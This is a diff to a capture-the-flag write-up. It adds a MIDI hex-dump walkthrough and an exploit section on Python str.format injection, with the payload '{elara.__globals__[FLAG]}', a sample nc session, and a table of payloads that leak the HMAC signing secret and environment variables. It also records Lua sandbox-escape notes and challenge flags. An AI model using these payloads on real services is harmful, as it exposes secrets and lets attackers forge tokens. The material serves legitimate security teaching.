@@ -434,9 +434,40 @@ POCTF{75.1619.QYL3A7E63L6VBSHC.ZJFJ4JO7TKGSPUFMGUUOGJGRR5}
 
 ### The file
 
-`score.mid` is a type-0 Standard MIDI File with one monophonic track. It
-contains 58 note-on events, each holding for a quarter note at 480 PPQ. The
-track name is "Forty Measures Deep".
+First run `xxd` to see its binary:
+
+```console
+$ xxd score.mid 
+00000000: 4d54 6864 0000 0006 0000 0001 01e0 4d54  MThd..........MT
+00000010: 726b 0000 0234 00ff 5103 0b71 b000 ff58  rk...4..Q..q...X
+00000020: 0404 0218 0800 ff03 1346 6f72 7479 204d  .........Forty M
+00000030: 6561 7375 7265 7320 4465 6570 0090 5040  easures Deep..P@
+00000040: 8360 8050 0000 904f 4083 6080 4f00 0090  .`.P...O@.`.O...
+00000050: 4340 8360 8043 0000 9054 4083 6080 5400  C@.`.C...T@.`.T.
+00000060: 0090 4640 8360 8046 0000 9040 4083 6080  ..F@.`.F...@@.`.
+...
+000001d0: 0000 905a 4083 6080 5a00 0090 3740 8360  ...Z@.`.Z...7@.`
+000001e0: 8037 0000 903a 4083 6080 3a00 0090 4940  .7...:@.`.:...I@
+000001f0: 8360 8049 0000 904e 4083 6080 4e00 0090  .`.I...N@.`.N...
+00000200: 4940 8360 8049 0000 904e 4083 6080 4e00  I@.`.I...N@.`.N.
+00000210: 0090 4640 8360 8046 0000 904a 4083 6080  ..F@.`.F...J@.`.
+00000220: 4a00 0090 5640 8360 8056 0000 9044 4083  J...V@.`.V...D@.
+00000230: 6080 4400 0090 5440 8360 8054 0000 905b  `.D...T@.`.T...[
+00000240: 4083 6080 5b00 00ff 2f00                 @.`.[.../.
+```
+
+MIDI file starts with `MThd` as header:
+- header: `00 00 00 06`, 6
+- format: `00 00`, 0, monophonic track
+- track number: `00 01`, 1
+- PPQ: `01 e0`, a quarter note at 480 PPQ
+- track name: "Forty Measures Deep"
+
+`MTrk` is the header of track:
+- length: `02 34`, 0x234, 564 bytes
+
+Track data is a sequence of events, every event consists of Delta-Time and 
+content of events
 
 We do not need to perform the score; we need its pitch numbers. Parse the
 track and collect every note-on event.
@@ -504,6 +535,110 @@ flag:  POCTF{74.1619.57WBSCSK227RPRQB.WKBQSVVD5W5YN3Z25ININFJVDT}
 
 ```
 POCTF{74.1619.57WBSCSK227RPRQB.WKBQSVVD5W5YN3Z25ININFJVDT}
+```
+
+## exploit-01: Read Me My Fortune
+
+**Solver:** `exploit-01-read-my-fortune.py`
+**Service source:** `attachments/exploit-01/`
+
+### The setup
+
+The challenge ships the full service source, which is unusually generous:
+
+```python
+reading = template.format(
+    name=name, sign=sign, date=date, elara=_greet,
+)
+```
+
+The player controls `template` completely. The only intended placeholders are
+`{name}`, `{sign}`, `{date}`, and `{elara}`. The flag is a module-level global
+created after the token check:
+
+```python
+FLAG = None
+
+def main():
+    global FLAG
+    ...
+    FLAG = _build_marker(cid, team_id, nonce)
+```
+
+So the goal is not to break the token check at all: the service derives the
+team flag for you and then hands you a string-formatting primitive in the same
+process.
+
+### Why `.format()` is dangerous
+
+Python's `str.format` is not a template language with variables; it is an
+object-graph walker. Each field is parsed as
+
+```text
+field_name ::= arg_name ("." attribute_name | "[" element_index "]")*
+```
+
+`arg_name` may be a name or a number, and every attribute access is a real
+`getattr` and every index is a real `__getitem__`. So `{elara}` does not just
+print the function, it gives you the function object, and you can keep walking:
+
+```python
+{elara.__globals__[FLAG]}
+```
+
+`_greet` is defined in `service.py`, so `_greet.__globals__` is the module
+globals dict of `__main__`, which is exactly where `FLAG` was assigned.
+
+### The exploit
+
+The payload is one line:
+
+```text
+{elara.__globals__[FLAG]}
+```
+
+`FLAG` is an unquoted element index, so it is looked up as the string
+`"FLAG"` in the globals dict. Rendering that field yields the flag directly.
+
+Full interaction:
+
+```console
+$ nc <host> <port>
+...
+  Token: EXP1.1619.127.IQGHFCSX77GP7HGI.1794545666.J4NMBQWH22DMTD5B4LIZM7UDOV
+
+  Welcome, member of team #1619. Your consultation is confirmed.
+...
+  What is your name? seeker
+  What is your star sign? Ophiuchus
+...
+  Template: {elara.__globals__[FLAG]}
+
+  ── Your Reading ─────────────────────────────────────────────
+  POCTF{127.1619.IQGHFCSX77GP7HGI.F2WPFJSWTWGWOP542XVYQODEE4}
+  ─────────────────────────────────────────────────────────────
+```
+
+### What else is reachable
+
+Once you can walk attributes, the whole process is in scope. Useful paths:
+
+| Payload | Result |
+|---------|--------|
+| `{elara.__globals__[FLAG]}` | the flag |
+| `{elara.__globals__}` | the whole module dict, including secrets |
+| `{elara.__globals__[FLAG_HMAC_SECRET]}` | the flag-signing secret |
+| `{elara.__globals__[os].environ}` | environment variables |
+
+The last two matter beyond this challenge: `FLAG_HMAC_SECRET` signs the
+session tokens, so leaking it would allow forging a token for any team and
+challenge, which is why the service is careful never to print a traceback in
+production.
+
+### Flag
+
+```text
+POCTF{127.1619.IQGHFCSX77GP7HGI.F2WPFJSWTWGWOP542XVYQODEE4}
 ```
 
 ## exploit-03: The Sandglass
@@ -576,6 +711,8 @@ pipe:close()
 return flag
 ```
 
+(This is not supported in platform: `runtime error: [string "sandbox"]:2: 'popen' not supported`)
+
 ### Local verification
 
 The repository dev shell provides Lua 5.4:
@@ -623,7 +760,7 @@ lua harness.lua exploit-03-the-sandglass.lua 1234
 Expected output:
 
 ```text
-POCTF{local-test}
+POCTF{128.1619.687dd42ffb219159.H4NH7DMPZGZUPGEWF3UQSSIWCJ}
 ```
 
 The real submission returns the flag for the current team; the flag itself is
@@ -1230,5 +1367,6 @@ POCTF{131.1619.fca89aa3f4077934.J5WUR3D3BOHL6XBJLOUNLAFCGK}
 | `crypto-04` | A Map of Small Things | Supersingular curve, smooth order, Pohlig-Hellman | `POCTF{7402776758243033309}` |
 | `crypto-07` | The Notary's Seal | Textbook RSA, low exponent, integer cube root | `POCTF{75.1619.QYL3A7E63L6VBSHC.ZJFJ4JO7TKGSPUFMGUUOGJGRR5}` |
 | `crypto-08` | Forty Measures Deep | MIDI note cipher, musical alphabet | `POCTF{74.1619.57WBSCSK227RPRQB.WKBQSVVD5W5YN3Z25ININFJVDT}` |
+| `exploit-01` | Read Me My Fortune | `str.format` attribute walk via `__globals__` | `POCTF{127.1619.IQGHFCSX77GP7HGI.F2WPFJSWTWGWOP542XVYQODEE4}` |
 | `exploit-03` | The Sandglass | Lua sandbox escape, arbitrary file read via `io.open` | `POCTF{128.1619.687dd42ffb219159.H4NH7DMPZGZUPGEWF3UQSSIWCJ}` |
-| `exploit-05` | What the Heap Remembers | Unchecked slab read leaks the in-memory XOR key | `POCTF{131.1619.fca89aa3f4077934.J5WUR3D3BOHL6XBJLOUNLAFCGK}` |
+| `exploit-05` | What the Heap Remembers | Unchecked slab read leaks the in-memory XOR key, fixed method for generating key (MurmurHashV2 and LCG) | `POCTF{131.1619.fca89aa3f4077934.J5WUR3D3BOHL6XBJLOUNLAFCGK}` |
